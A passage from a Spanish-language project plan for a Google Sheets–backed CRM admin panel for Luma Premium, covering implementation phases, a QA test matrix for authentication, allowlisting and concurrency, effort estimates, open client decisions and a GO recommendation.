  * Registro del cliente Google OAuth en la consola de Google Cloud (`luma-premium-production`).
* **Fase 2 — Integración de Seguridad y Auth.js:**
  * Instalación de `next-auth` y `zod`.
  * Configuración del middleware de redirección en `/admin` y protección de rutas.
* **Fase 3 — Capa de Acceso a Datos (DAL):**
  * Escritura de utilidades de lectura `src/lib/crm-sheets.ts` para leer de forma segura las pestañas de CRM utilizando OIDC.
  * Lógica de generación del ID determinista.
* **Fase 4 — Desarrollo de Interfaz de Leads:**
  * Desarrollo del dashboard `/admin` y de la tabla de prospectos `/admin/leads`.
  * Implementación de filtros y caja de búsqueda.
* **Fase 5 — Seguimiento Comercial y Server Actions:**
  * Creación de `/admin/leads/[id]`.
  * Acciones del servidor para añadir notas y cambiar estados comerciales.
* **Fase 6 — QA Final y Despliegue:**
  * Ejecución de pruebas con datos ficticios en entorno Preview.
  * Promoción y despliegue definitivo a `main`.

---

## 18. Plan de Control de Calidad (QA) y Preview

Para validar la construcción sin alterar los datos reales, se seguirán estas pautas (`RECOMENDACIÓN`):

### 1. Aislamiento de Entorno (QA Sheets)
* **Producción:** Apunta al documento de Sheets principal (`LUMA_LEADS_SPREADSHEET_ID`).
* **Preview / Staging:** Se recomienda configurar en Vercel una variable `LUMA_LEADS_SPREADSHEET_ID` para entornos Preview que apunte a un **Spreadsheet de QA duplicado**. Esto garantiza que las pruebas de mutaciones del CRM no toquen ni contaminen los registros reales de captación comercial.
* **Modo Local Recomendado:** Para el entorno de desarrollo local, se debe habilitar exclusivamente el modo:
  ```text
  CRM_DATA_MODE=mock
  ```
  El modo local utilizará exclusivamente datos sintéticos, inhabilitando las llamadas a las APIs de Google y la necesidad de credenciales de GCP de manera local. Los entornos Preview y Production continuarán usando autenticación OIDC y spreadsheets configurados dinámicamente por ambiente.

### 2. Casos de Prueba Críticos (Matriz QA)
* **QA-1 (Acceso no autorizado):** Intentar ingresar a `/admin`, `/admin/leads`, y `/admin/leads/[id]` sin sesión. Debe redirigir automáticamente a `/admin/login`.
* **QA-2 (Filtro de Allowlist):** Intentar loguearse con una cuenta de Google cuyo email no esté en `ALLOWED_CRM_EMAILS`. El sistema debe rechazar el login mostrando un mensaje claro: "Acceso no autorizado".
* **QA-3 (Join en Memoria Eficiente):** Agregar un lead mediante el formulario público y verificar que aparece instantáneamente en la tabla del CRM en estado "Nuevo".
* **QA-4 (Concurrencia):** Simular que Marcos y William editan el estado de un lead con la misma versión. El segundo en guardar debe recibir un error descriptivo: "El lead ha sido actualizado por otro usuario. Por favor recarga la página".
* **QA-5 (Seguridad de API):** Enviar peticiones directas de Server Actions de CRM (como `addCrmNote`) usando herramientas como curl. Deben ser bloqueadas devolviendo `401 Unauthorized` si no hay token de sesión válido.

---

## 19. Análisis de Complejidad por Módulo

Estimación preliminar de esfuerzo basada en la arquitectura sidecar propuesta (`RECOMENDACIÓN`):

| Módulo | Complejidad | Tiempo Estimado | Justificación |
| :--- | :---: | :---: | :--- |
| **Infraestructura y Auth** | Media | 1.5 días | Configuración de Google OAuth en GCP y despliegue de middleware con Auth.js. |
| **Capa de Datos (DAL)** | Alta | 2.5 días | Manejo del join en memoria de Sheets, generación de IDs deterministas y control de concurrencia. |
| **Dashboard y Tablas** | Media | 2.0 días | Creación de componentes visuales adaptativos y lógica de búsqueda/filtrado interactivo. |
| **Ficha de Lead y Notas** | Media | 2.0 días | Componentes de bitácora, botones rápidos de comunicación y formulario de comentarios. |
| **Seguridad y Auditoría** | Media | 1.0 día | Restricciones de rol por acción y guardado seguro de logs e inyección de datos. |
| **QA y Lanzamiento** | Baja | 1.0 día | Pruebas de regresión pública e integración en Vercel Preview. |
| **TOTAL ESTIMADO** | | **10.0 días** | MVP completo, testeado y listo para producción sin dependencias externas complejas. |

---

## 20. Decisiones Pendientes de Validación

Identificamos los siguientes puntos que requieren confirmación expresa del cliente antes de iniciar la programación (`PENDIENTE DE VALIDACIÓN`):

1. **Correos para el Acceso:** Confirmar las cuentas de correo electrónico de Google exactas que utilizarán Marcos y William para agregarlas a la lista de variables de entorno permitidas.
2. **Spreadsheet de QA:** Validar si se creará un Spreadsheet independiente para testing/QA en vistas previas o si se utilizarán pestañas duplicadas dentro de la misma hoja para simplificar.
3. **Volumen de Prospectos Mensuales:** Validar la estimación de leads esperados para el próximo trimestre. Si el volumen es menor a 1,000 leads, el join en memoria con Google Sheets funcionará a la perfección. Si se proyectan decenas de miles de leads, se debe replantear migrar a una Base de Datos Externa (PostgreSQL) para evitar lentitud y límites de cuota de API.

---

## 21. Recomendación Final de Go / No-Go

### Veredicto: **GO** (`RECOMENDACIÓN`)

La base técnica de Luma Premium es sumamente limpia y moderna. La integración mediante Vercel OIDC proporciona un canal seguro, robusto y gratuito para interactuar con la suite de Google sin el riesgo de almacenar archivos de claves. 

El uso de una arquitectura **Sidecar con pestañas separadas en Sheets** permite entregar el CRM MVP de manera ágil, barata y 100% aislada de la lógica de captación actual de la landing page pública. Los formularios existentes en español e inglés no sufrirán ninguna afectación ni regresión, cumpliendo estrictamente con los límites de resguardo definidos para el proyecto. 

Se recomienda proceder con la creación de las pestañas en el documento y la configuración del cliente Google OAuth para iniciar la Fase 1 de implementación de manera inmediata.
